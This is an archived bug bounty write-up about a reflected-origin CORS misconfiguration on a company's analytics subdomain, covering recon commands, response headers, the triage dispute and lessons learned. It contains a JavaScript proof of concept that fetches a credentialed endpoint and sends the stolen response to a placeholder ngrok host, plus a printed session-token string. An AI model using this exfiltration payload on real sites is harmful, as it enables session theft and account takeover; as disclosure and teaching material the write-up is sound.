# How I Discovered a Critical CORS Misconfiguration in a Bug Bounty Target — And What Happened Next

- **Source URL:** https://medium.com/@eslamatef396/how-i-discovered-a-critical-cors-misconfiguration-in-a-bug-bounty-target-and-what-happened-next-6bc5e5ee1e14?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905185108/https://medium.com/@eslamatef396/how-i-discovered-a-critical-cors-misconfiguration-in-a-bug-bounty-target-and-what-happened-next-6bc5e5ee1e14
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10179 (id 10179)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **How I Discovered a Critical CORS Misconfiguration in a Bug Bounty Target — And What Happened Next**

Hi everyone 👋,

In this article, I’ll walk you through a real experience I had while hunting for bugs on a public bug bounty program. The vulnerability? A **CORS misconfiguration** — and the result? Well… let’s just say **not everything went as expected.**

as all hackers i started with gather information about the target using combination of well known tools as subfinder , sublist3r , amass , subenum

then i filtered the collected subdomains using httpx using this command .

`httpx -l target_subs.txt -sc -ip > filtered_subs.txt`
then i show subs with 200 status code

`cat filtered_subs.txt | grep 200` see this and start visit each one of them using burpsuite to analyze this subs .

i find some of them contains cors misconfiguration in response like this :

```
access-control-allow-origin: https://anything.one.sitename.com
Access-Control-Allow-Credentials: true
//and this session token
login_service_login_companyname_com_tokens: 
1LZlAFOBrrVQfAQOgL%2BOLcyiy4%2FBTfePCxjCFYB%2FAHm88CKbEUpybP73%2BIUP4mf%2FpLTFtHQCaIw2Vo8fQXW2uvJLL1A%2F4Kw4X98n%2FLbtXH4YvBexG8xCscsz5eVeREhqivwdeY3c3OuPeJpTx7wPO8DSpAkyHFKCrUyYy%2BoblGWjd3L1CAuT%2FIfXYO9WqCTJcPrSak%2BOrLKO4c0bEbDFsYK891N9p%2BC5N6yFCkN497YXmHyhY4yBTNtGtOCFXY2PGFZfOGST6WSGcfwW8b82TT2c0H4AZio%2FTPC6HuRgaJnglXYFRkTyhQ7qqdprR%2FJ%2FDgaRVhqbuAMRsCDRTwhbo2XBsLgXH%2BhubaoJcBT3u8Td5NbY80Fi1Z9pIoBwx6XqQLjxFLzHoYU6O3QlwDn1usuQjrZrBen7ugi8mfYiE31GOAo0tRylCDCO5v9v9FxMyCFflILXXWWqU4EE7KI4nSShOcSm6x8fjZ%2FLlgoxAJXaWgS4pJWYDOK8mJPLjrRQs0MczvQ%2Fgx2IO1opgYcyimYrr1AXW4KlgZLvde6%2FeS6OZ9l%2FMwTWJq18xsidIl%2B4wbIsMMDf9zAPnYWJCkWl16DWkhQ3KTnvYTZg%2BiLObCS%2B30%3D%22%2C%22refresh_token%22%3A%22RUSkWFaDJo13VRmyoQa%2BESkxRbkFMLoyobMYJ7LXzGUb6L2xfHwxbBp9GhDAsZJ42pqPvNyo8CxYHEN6kkBZguw2bEClSxgSowzwjCSV3ay
```
but this require subdomain take over vulnerability and i got there is no sub domain vulnerable to it .

so i continue to other and i found this subdomain in my way :

`https://platform-insights-collector.companyname.com/v1/accounts/xxxxxx/events`
when i changed :

`Origin: https://me.com`
the server response with :

```
access-control-allow-origin: https://me.com
Access-Control-Allow-Credentials: true
//and this session token
login_service_login_companyname_com_tokens: 
1LZlAFOBrrVQfAQOgL%2BOLcyiy4%2FBTfePCxjCFYB%2FAHm88CKbEUpybP73%2BIUP4mf%2FpLTFtHQCaIw2Vo8fQXW2uvJLL1A%2F4Kw4X98n%2FLbtXH4YvBexG8xCscsz5eVeREhqivwdeY3c3OuPeJpTx7wPO8DSpAkyHFKCrUyYy%2BoblGWjd3L1CAuT%2FIfXYO9WqCTJcPrSak%2BOrLKO4c0bEbDFsYK891N9p%2BC5N6yFCkN497YXmHyhY4yBTNtGtOCFXY2PGFZfOGST6WSGcfwW8b82TT2c0H4AZio%2FTPC6HuRgaJnglXYFRkTyhQ7qqdprR%2FJ%2FDgaRVhqbuAMRsCDRTwhbo2XBsLgXH%2BhubaoJcBT3u8Td5NbY80Fi1Z9pIoBwx6XqQLjxFLzHoYU6O3QlwDn1usuQjrZrBen7ugi8mfYiE31GOAo0tRylCDCO5v9v9FxMyCFflILXXWWqU4EE7KI4nSShOcSm6x8fjZ%2FLlgoxAJXaWgS4pJWYDOK8mJPLjrRQs0MczvQ%2Fgx2IO1opgYcyimYrr1AXW4KlgZLvde6%2FeS6OZ9l%2FMwTWJq18xsidIl%2B4wbIsMMDf9zAPnYWJCkWl16DWkhQ3KTnvYTZg%2BiLObCS%2B30%3D%22%2C%22refresh_token%22%3A%22RUSkWFaDJo13VRmyoQa%2BESkxRbkFMLoyobMYJ7LXzGUb6L2xfHwxbBp9GhDAsZJ42pqPvNyo8CxYHEN6kkBZguw2bEClSxgSowzwjCSV3ay
```
so here is the complete vulnerability then i make things ready to exploit .

and try to access it through localhost server and it works even the request contains the session token (login\_service\_login\_companyname\_com\_tokens) .

i created page on localhost called “real cors.html” with this js code :

```
<html>
  <body>
    <h1>Testing CORS Exploit on companyname</h1>
    <script>
      fetch("https://platform-insights-collector.companyname.com/v1/accounts/xxxxxx/events", {
        method: "GET",
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        // Send the stolen data to your ngrok server
        fetch("https://your_ngrok_link.ngrok-free.app/?data=" + btoa(data));
      })
      .catch(err => {
        console.error("Error:", err);
      });
    </script>
  </body>
</html>
```
and make sure that to be sign in to get valid session token in exploit .

i opened python server .

and as a victim i visited the js code “real cors.html” page .

so the session token back in response headers .

now i can use this token as attacker .

and as attacker i could request

[https://one.companyname.com/user-preferences](https://one.companyname.com/user-preferences) page that holds user data such as email , name , id and the page response with same session as valid .

and also can request change email page to request change email that lead to full ATO (Account Take Over) .

finally team told me that :

Unfortunately, by the time the triager asked me to re-test from an external origin, the misconfiguration had already been mitigated — meaning the exploit no longer worked.

Despite providing **proof that the vulnerability existed and was exploitable**, the program chose to close the report as **“Not Applicable”**, stating there was *no proof of sensitive data exfiltration* — **even though the session token was visible in the screenshots** I submitted


and they said that :

Thank you for your reply request. Your initial submission queried an event and forwarded the HTTP response body to an attacker-controlled location. However no PoC demonstrating the remote attacker could obtain anything sensitive from the response was provided **and validated**. In the future please make sure you always provide us with a complete PoC on your submissions.

We will keep this submission as it is.


I submitted the report to the bug bounty program with full details, screenshots, PoC, and impact.

But by the time the triager asked me to retest from an **internet-facing origin**, the endpoint had already been patched — it now returned a `302` with no `Access-Control-Allow-Origin` and 

Access-Control-Allow-Credentials headers .

## This left me with one major question:

*If the bug wasn’t valid… why did they fix it immediately after I reported it?*


The CORS misconfiguration was real.

The session token was real.

The impact was real.

But since I couldn’t reproduce it from a public server *after it had been fixed*, it was marked ineligible.

but after searching i understand that there are some forbidden headers for the browser to get it in response the set-cookie is one from them

so that they refuse the vulnerability although it works because no danger can happen from attacker due to browser but any time the developer will set sensitive data in response body the attacker will be able to read it in the response and browser will not prevent it so this still a vulnerability and dangerous at the time developer will edit the response data .

## What I Learned:

- Always prepare a **publicly-hosted PoC** as early as possible — don’t rely on localhost only.
- Don’t assume screenshots will be enough to prove impact. Provide explicit steps + real-time demonstrations.
- Even when you’re right, you may not get rewarded — **but the knowledge you gain is always yours.**

## Finally :

Bug bounty isn’t always fair. But it *is* a powerful way to learn, grow, and uncover vulnerabilities that make the internet safer.

I’m proud of the work I did — and I’ll keep improving with every report.

Contact : [MYLINKEDIN](https://www.linkedin.com/in/eslam-atef-0a0491250/)
